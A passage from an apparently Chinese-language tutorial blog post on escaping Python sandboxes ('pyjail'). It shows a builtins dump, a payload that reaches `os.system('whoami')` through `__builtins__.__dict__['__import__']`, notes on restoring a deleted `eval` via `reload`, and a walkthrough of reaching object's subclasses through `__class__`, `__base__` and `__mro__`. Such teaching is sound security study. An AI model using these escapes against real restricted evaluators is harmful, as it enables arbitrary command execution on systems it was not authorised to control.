 <span class="token string">'FloatingPointError'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'FloatingPointError'</span><span class="token operator">></span>
 <span class="token string">'OverflowError'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'OverflowError'</span><span class="token operator">></span>
 <span class="token string">'ZeroDivisionError'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'ZeroDivisionError'</span><span class="token operator">></span>
 <span class="token string">'SystemError'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'SystemError'</span><span class="token operator">></span>
 <span class="token string">'ReferenceError'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'ReferenceError'</span><span class="token operator">></span>
 <span class="token string">'MemoryError'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'MemoryError'</span><span class="token operator">></span>
 <span class="token string">'BufferError'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'BufferError'</span><span class="token operator">></span>
 <span class="token string">'Warning'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'Warning'</span><span class="token operator">></span>
 <span class="token string">'UserWarning'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'UserWarning'</span><span class="token operator">></span>
 <span class="token string">'DeprecationWarning'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'DeprecationWarning'</span><span class="token operator">></span>
 <span class="token string">'PendingDeprecationWarning'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'PendingDeprecationWarning'</span><span class="token operator">></span>
 <span class="token string">'SyntaxWarning'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'SyntaxWarning'</span><span class="token operator">></span>
 <span class="token string">'RuntimeWarning'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'RuntimeWarning'</span><span class="token operator">></span>
 <span class="token string">'FutureWarning'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'FutureWarning'</span><span class="token operator">></span>
 <span class="token string">'ImportWarning'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'ImportWarning'</span><span class="token operator">></span>
 <span class="token string">'UnicodeWarning'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'UnicodeWarning'</span><span class="token operator">></span>
 <span class="token string">'BytesWarning'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'BytesWarning'</span><span class="token operator">></span>
 <span class="token string">'ResourceWarning'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'ResourceWarning'</span><span class="token operator">></span>
 <span class="token string">'ConnectionError'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'ConnectionError'</span><span class="token operator">></span>
 <span class="token string">'BlockingIOError'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'BlockingIOError'</span><span class="token operator">></span>
 <span class="token string">'BrokenPipeError'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'BrokenPipeError'</span><span class="token operator">></span>
 <span class="token string">'ChildProcessError'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'ChildProcessError'</span><span class="token operator">></span>
 <span class="token string">'ConnectionAbortedError'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'ConnectionAbortedError'</span><span class="token operator">></span>
 <span class="token string">'ConnectionRefusedError'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'ConnectionRefusedError'</span><span class="token operator">></span>
 <span class="token string">'ConnectionResetError'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'ConnectionResetError'</span><span class="token operator">></span>
 <span class="token string">'FileExistsError'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'FileExistsError'</span><span class="token operator">></span>
 <span class="token string">'FileNotFoundError'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'FileNotFoundError'</span><span class="token operator">></span>
 <span class="token string">'IsADirectoryError'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'IsADirectoryError'</span><span class="token operator">></span>
 <span class="token string">'NotADirectoryError'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'NotADirectoryError'</span><span class="token operator">></span>
 <span class="token string">'InterruptedError'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'InterruptedError'</span><span class="token operator">></span>
 <span class="token string">'PermissionError'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'PermissionError'</span><span class="token operator">></span>
 <span class="token string">'ProcessLookupError'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'ProcessLookupError'</span><span class="token operator">></span>
 <span class="token string">'TimeoutError'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'TimeoutError'</span><span class="token operator">></span>
 <span class="token string">'open'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>built<span class="token operator">-</span><span class="token keyword">in</span> function <span class="token builtin">open</span><span class="token operator">></span>
 <span class="token string">'quit'</span><span class="token punctuation">:</span> Use quit<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">or</span> Ctrl<span class="token operator">-</span>D <span class="token punctuation">(</span>i<span class="token punctuation">.</span>e<span class="token punctuation">.</span> EOF<span class="token punctuation">)</span> to exit
 <span class="token string">'exit'</span><span class="token punctuation">:</span> Use exit<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">or</span> Ctrl<span class="token operator">-</span>D <span class="token punctuation">(</span>i<span class="token punctuation">.</span>e<span class="token punctuation">.</span> EOF<span class="token punctuation">)</span> to exit
 <span class="token string">'copyright'</span><span class="token punctuation">:</span> Copyright <span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token number">2001</span><span class="token operator">-</span><span class="token number">2021</span> Python Software Foundation<span class="token punctuation">.</span>
 <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p><code>x.__dict__</code>：x 内部所有属性名和属性值组成的字典<br>1.内置的数据类型没有 <code>__dict__</code> 属性<br>2.每个类有自己的 <code>__dict__</code> 属性，就算存着继承关系，父类的 <code>__dict__</code> 并不会影响子类的 <code>__dict__</code><br>3.对象也有自己的 <code>__dict__</code> 属性，包含 <code>self.xxx</code> 这种实例属性</p>
</blockquote>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">__builtins__<span class="token punctuation">.</span>__dict__<span class="token punctuation">[</span><span class="token string">'__import__'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'os'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'whoami'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="reload-重载"><a href="#reload-重载" class="headerlink" title="reload 重载"></a>reload 重载</h3><p>和上面类似的 waf 操作，可以覆写或者 del 掉其中的危险函数：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">__builtins__<span class="token punctuation">.</span>__dict__<span class="token punctuation">[</span><span class="token string">'eval'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'not allowed'</span>
<span class="token keyword">del</span> __builtins__<span class="token punctuation">.</span>__dict__<span class="token punctuation">[</span><span class="token string">'eval'</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>但是在 python2 中，存在 <code>reload</code> 函数可以重新加载模块，这样被删除的函数就能重新加载</p>
<p><img src="/blog/2023/06/07/python-jail/IMG-20250923103820178.png"></p>
<p>在 python3 中，reload 函数被移动到 imp &#x2F; importlib 模块中，所以如果要使用 reload 函数，需要先导入 imp &#x2F; importlib 模块</p>
<p>但是在我测试的 python 3.9.6 中，导入 imp 会由于 eval 已经被修改导致导入失败，导入 importlib 执行 <code>importlib.reload(__builtins__)</code> 也无法实现重置 eval</p>
<hr>
<h3 id="继承链绕过-no-builtins"><a href="#继承链绕过-no-builtins" class="headerlink" title="继承链绕过 no builtins"></a>继承链绕过 no builtins</h3><p>如果 builtins 本身被覆写的话，此时就需要尝试在其他已加载的对象中重新获取 builtins</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">eval</span><span class="token punctuation">(</span>payload<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">'__builtin__'</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>Python 中，类本身具有一些静态方法，可以使用 <code>dir()</code> 进行查看</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token builtin">dir</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token string">'__add__'</span><span class="token punctuation">,</span> <span class="token string">'__class__'</span><span class="token punctuation">,</span> <span class="token string">'__contains__'</span><span class="token punctuation">,</span> <span class="token string">'__delattr__'</span><span class="token punctuation">,</span> <span class="token string">'__dir__'</span><span class="token punctuation">,</span> <span class="token string">'__doc__'</span><span class="token punctuation">,</span> <span class="token string">'__eq__'</span><span class="token punctuation">,</span> <span class="token string">'__format__'</span><span class="token punctuation">,</span> <span class="token string">'__ge__'</span><span class="token punctuation">,</span> <span class="token string">'__getattribute__'</span><span class="token punctuation">,</span> <span class="token string">'__getitem__'</span><span class="token punctuation">,</span> <span class="token string">'__getnewargs__'</span><span class="token punctuation">,</span> <span class="token string">'__gt__'</span><span class="token punctuation">,</span> <span class="token string">'__hash__'</span><span class="token punctuation">,</span> <span class="token string">'__init__'</span><span class="token punctuation">,</span> <span class="token string">'__init_subclass__'</span><span class="token punctuation">,</span> <span class="token string">'__iter__'</span><span class="token punctuation">,</span> <span class="token string">'__le__'</span><span class="token punctuation">,</span> <span class="token string">'__len__'</span><span class="token punctuation">,</span> <span class="token string">'__lt__'</span><span class="token punctuation">,</span> <span class="token string">'__mod__'</span><span class="token punctuation">,</span> <span class="token string">'__mul__'</span><span class="token punctuation">,</span> <span class="token string">'__ne__'</span><span class="token punctuation">,</span> <span class="token string">'__new__'</span><span class="token punctuation">,</span> <span class="token string">'__reduce__'</span><span class="token punctuation">,</span> <span class="token string">'__reduce_ex__'</span><span class="token punctuation">,</span> <span class="token string">'__repr__'</span><span class="token punctuation">,</span> <span class="token string">'__rmod__'</span><span class="token punctuation">,</span> <span class="token string">'__rmul__'</span><span class="token punctuation">,</span> <span class="token string">'__setattr__'</span><span class="token punctuation">,</span> <span class="token string">'__sizeof__'</span><span class="token punctuation">,</span> <span class="token string">'__str__'</span><span class="token punctuation">,</span> <span class="token string">'__subclasshook__'</span><span class="token punctuation">,</span> <span class="token string">'capitalize'</span><span class="token punctuation">,</span> <span class="token string">'casefold'</span><span class="token punctuation">,</span> <span class="token string">'center'</span><span class="token punctuation">,</span> <span class="token string">'count'</span><span class="token punctuation">,</span> <span class="token string">'encode'</span><span class="token punctuation">,</span> <span class="token string">'endswith'</span><span class="token punctuation">,</span> <span class="token string">'expandtabs'</span><span class="token punctuation">,</span> <span class="token string">'find'</span><span class="token punctuation">,</span> <span class="token string">'format'</span><span class="token punctuation">,</span> <span class="token string">'format_map'</span><span class="token punctuation">,</span> <span class="token string">'index'</span><span class="token punctuation">,</span> <span class="token string">'isalnum'</span><span class="token punctuation">,</span> <span class="token string">'isalpha'</span><span class="token punctuation">,</span> <span class="token string">'isascii'</span><span class="token punctuation">,</span> <span class="token string">'isdecimal'</span><span class="token punctuation">,</span> <span class="token string">'isdigit'</span><span class="token punctuation">,</span> <span class="token string">'isidentifier'</span><span class="token punctuation">,</span> <span class="token string">'islower'</span><span class="token punctuation">,</span> <span class="token string">'isnumeric'</span><span class="token punctuation">,</span> <span class="token string">'isprintable'</span><span class="token punctuation">,</span> <span class="token string">'isspace'</span><span class="token punctuation">,</span> <span class="token string">'istitle'</span><span class="token punctuation">,</span> <span class="token string">'isupper'</span><span class="token punctuation">,</span> <span class="token string">'join'</span><span class="token punctuation">,</span> <span class="token string">'ljust'</span><span class="token punctuation">,</span> <span class="token string">'lower'</span><span class="token punctuation">,</span> <span class="token string">'lstrip'</span><span class="token punctuation">,</span> <span class="token string">'maketrans'</span><span class="token punctuation">,</span> <span class="token string">'partition'</span><span class="token punctuation">,</span> <span class="token string">'removeprefix'</span><span class="token punctuation">,</span> <span class="token string">'removesuffix'</span><span class="token punctuation">,</span> <span class="token string">'replace'</span><span class="token punctuation">,</span> <span class="token string">'rfind'</span><span class="token punctuation">,</span> <span class="token string">'rindex'</span><span class="token punctuation">,</span> <span class="token string">'rjust'</span><span class="token punctuation">,</span> <span class="token string">'rpartition'</span><span class="token punctuation">,</span> <span class="token string">'rsplit'</span><span class="token punctuation">,</span> <span class="token string">'rstrip'</span><span class="token punctuation">,</span> <span class="token string">'split'</span><span class="token punctuation">,</span> <span class="token string">'splitlines'</span><span class="token punctuation">,</span> <span class="token string">'startswith'</span><span class="token punctuation">,</span> <span class="token string">'strip'</span><span class="token punctuation">,</span> <span class="token string">'swapcase'</span><span class="token punctuation">,</span> <span class="token string">'title'</span><span class="token punctuation">,</span> <span class="token string">'translate'</span><span class="token punctuation">,</span> <span class="token string">'upper'</span><span class="token punctuation">,</span> <span class="token string">'zfill'</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>而对于这些类的实例，可以直接调用这些静态方法，以 <code>&#39;&#39;</code> 这个字符串对象为例：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token string">''</span><span class="token punctuation">.</span>__class__	<span class="token comment"># 返回当前实例对象所属的类</span>
<span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'str'</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>而对于 str 类本身，由于 python 中一切皆对象，所以可以返回 str 所属的类</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token string">''</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__class__	<span class="token comment"># 等价于 str.__class__</span>
<span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'type'</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>对于 type 类</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token builtin">dir</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__class__<span class="token punctuation">)</span>	<span class="token comment"># 等价于 dir(type)</span>
<span class="token punctuation">[</span><span class="token string">'__abstractmethods__'</span><span class="token punctuation">,</span> <span class="token string">'__base__'</span><span class="token punctuation">,</span> <span class="token string">'__bases__'</span><span class="token punctuation">,</span> <span class="token string">'__basicsize__'</span><span class="token punctuation">,</span> <span class="token string">'__call__'</span><span class="token punctuation">,</span> <span class="token string">'__class__'</span><span class="token punctuation">,</span> <span class="token string">'__delattr__'</span><span class="token punctuation">,</span> <span class="token string">'__dict__'</span><span class="token punctuation">,</span> <span class="token string">'__dictoffset__'</span><span class="token punctuation">,</span> <span class="token string">'__dir__'</span><span class="token punctuation">,</span> <span class="token string">'__doc__'</span><span class="token punctuation">,</span> <span class="token string">'__eq__'</span><span class="token punctuation">,</span> <span class="token string">'__flags__'</span><span class="token punctuation">,</span> <span class="token string">'__format__'</span><span class="token punctuation">,</span> <span class="token string">'__ge__'</span><span class="token punctuation">,</span> <span class="token string">'__getattribute__'</span><span class="token punctuation">,</span> <span class="token string">'__gt__'</span><span class="token punctuation">,</span> <span class="token string">'__hash__'</span><span class="token punctuation">,</span> <span class="token string">'__init__'</span><span class="token punctuation">,</span> <span class="token string">'__init_subclass__'</span><span class="token punctuation">,</span> <span class="token string">'__instancecheck__'</span><span class="token punctuation">,</span> <span class="token string">'__itemsize__'</span><span class="token punctuation">,</span> <span class="token string">'__le__'</span><span class="token punctuation">,</span> <span class="token string">'__lt__'</span><span class="token punctuation">,</span> <span class="token string">'__module__'</span><span class="token punctuation">,</span> <span class="token string">'__mro__'</span><span class="token punctuation">,</span> <span class="token string">'__name__'</span><span class="token punctuation">,</span> <span class="token string">'__ne__'</span><span class="token punctuation">,</span> <span class="token string">'__new__'</span><span class="token punctuation">,</span> <span class="token string">'__prepare__'</span><span class="token punctuation">,</span> <span class="token string">'__qualname__'</span><span class="token punctuation">,</span> <span class="token string">'__reduce__'</span><span class="token punctuation">,</span> <span class="token string">'__reduce_ex__'</span><span class="token punctuation">,</span> <span class="token string">'__repr__'</span><span class="token punctuation">,</span> <span class="token string">'__setattr__'</span><span class="token punctuation">,</span> <span class="token string">'__sizeof__'</span><span class="token punctuation">,</span> <span class="token string">'__str__'</span><span class="token punctuation">,</span> <span class="token string">'__subclasscheck__'</span><span class="token punctuation">,</span> <span class="token string">'__subclasses__'</span><span class="token punctuation">,</span> <span class="token string">'__subclasshook__'</span><span class="token punctuation">,</span> <span class="token string">'__text_signature__'</span><span class="token punctuation">,</span> <span class="token string">'__weakrefoffset__'</span><span class="token punctuation">,</span> <span class="token string">'mro'</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>有 <code>__base__</code> 和 <code>__bases__</code>，还有 <code>__mro__</code>， 因为 str 继承了 type 类，所以可以在 str 类下调用父类 type 里的方法</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token string">''</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__	<span class="token comment"># __base__ 返回当前类的基类</span>
<span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'object'</span><span class="token operator">></span>
<span class="token operator">>></span><span class="token operator">></span> <span class="token string">''</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__	<span class="token comment"># 以元组形式返回</span>
<span class="token punctuation">(</span><span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'object'</span><span class="token operator">></span><span class="token punctuation">,</span><span class="token punctuation">)</span>
<span class="token operator">>></span><span class="token operator">></span> <span class="token string">''</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__	<span class="token comment"># 以元组形式返回类的继承关系</span>
<span class="token punctuation">(</span><span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'str'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'object'</span><span class="token operator">></span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>那么这里 str 类的基类就是 <code>object</code>，object 是所有类的超类</p>
<p>注意，经典类需要指明继承 object 才会继承它，否则不会继承：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">class</span> <span class="token class-name">test</span><span class="token punctuation">:</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>     <span class="token keyword">pass</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span class="token operator">>></span><span class="token operator">></span> test<span class="token punctuation">.</span>__bases__
<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">class</span> <span class="token class-name">test</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>     <span class="token keyword">pass</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span class="token operator">>></span><span class="token operator">></span> test<span class="token punctuation">.</span>__bases__
<span class="token punctuation">(</span><span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'object'</span><span class="token operator">></span><span class="token punctuation">,</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>那么这个 object 类下有啥呢，这里先讲一下 type 和 object 的关系：</p>
<blockquote>
<p>Python 中一切皆对象，所以 <code>object</code> 是所有对象的最高层父类，而 object 本身又是一个类<br><code>type</code> 则是“类”的类，继承了 object 的同时又创建各种类，包括 object 类本身<br>要问两者的关系就像是先有鸡还是先有蛋一样，共生，必须同时出现</p>
</blockquote>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token builtin">type</span><span class="token punctuation">.</span>__class__
<span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'type'</span><span class="token operator">></span>
<span class="token operator">>></span><span class="token operator">></span> <span class="token builtin">type</span><span class="token punctuation">.</span>__base__
<span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'object'</span><span class="token operator">></span>
<span class="token operator">>></span><span class="token operator">></span> <span class="token builtin">object</span><span class="token punctuation">.</span>__class__
<span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'type'</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>所以同样的，object 也继承了 type 的方法，其中 <code>__subclasses__</code> 方法可以查看引用了这个类的直接子类：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">:</span> <span class="token keyword">pass</span>
<span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">class</span> <span class="token class-name">B</span><span class="token punctuation">(</span>A<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">pass</span>
<span class="token operator">>></span><span class="token operator">></span> A<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'B'</span><span class="token operator">></span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>现在看一下 object 类的直接子类：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> 
<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'type'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'weakref'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'weakcallableproxy'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'weakproxy'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'int'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'bytearray'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'bytes'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'list'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'NoneType'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'NotImplementedType'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'traceback'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'super'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'range'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">13</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'dict'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'dict_keys'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'dict_values'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'dict_items'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">17</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'dict_reversekeyiterator'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">18</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'dict_reversevalueiterator'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">19</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'dict_reverseitemiterator'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'odict_iterator'</span><span class="token operator">></span><span class="token punctuation">)</span>
